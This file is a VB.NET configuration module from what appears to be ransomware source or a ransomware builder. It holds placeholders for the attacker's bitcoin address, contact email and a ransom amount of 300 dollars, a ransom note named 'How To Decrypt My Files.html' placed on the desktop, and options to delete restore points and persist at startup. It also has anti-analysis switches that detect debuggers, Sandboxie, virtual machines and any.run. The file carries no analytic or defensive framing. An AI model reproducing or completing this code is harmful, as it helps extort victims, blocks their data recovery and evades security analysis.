﻿Module St
    'options
    Public hash As String
    Public startup As String = "%startup%" 'startup
    Public DeleteRestorePoints As String = "%RestorePoints%"
    Public mute As String = "%mute%" 'mute

    Public exs As String = "%exst%" ' exs
    Public html As String = Environment.GetFolderPath(Environment.SpecialFolder.Desktop) & "\How To Decrypt My Files.html"

    Public btc As String = "%address%" ' your btc address
    Public email As String = "%email%" ' your email
    Public amount As String = "%Am%" ' 300 $
    Public logg As String = "%urlll%"


    ' Anti Analysi
    Public Emulator As String = "%Emulator%"
    Public DetectDebugger As String = "%DetectDebugger%"
    Public DetectSandboxie As String = "%DetectSandboxie%"
    Public DetectVirtualMachine As String = "%DetectVirtualMachine%"
    Public anyrun As String = "%anyrun%"

    ' Time
    Public Setting As String = "Runcount.cry"
    Public H As Integer = "%H%"
    Public m As Integer = "%M%"
    Public Del As Object = GetSetting("D", "0", St.Setting)
    Public Attempts As String = "%Attempts%"


    Public maxrandom As Integer = 20
    Public validchars As String = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890"

End Module
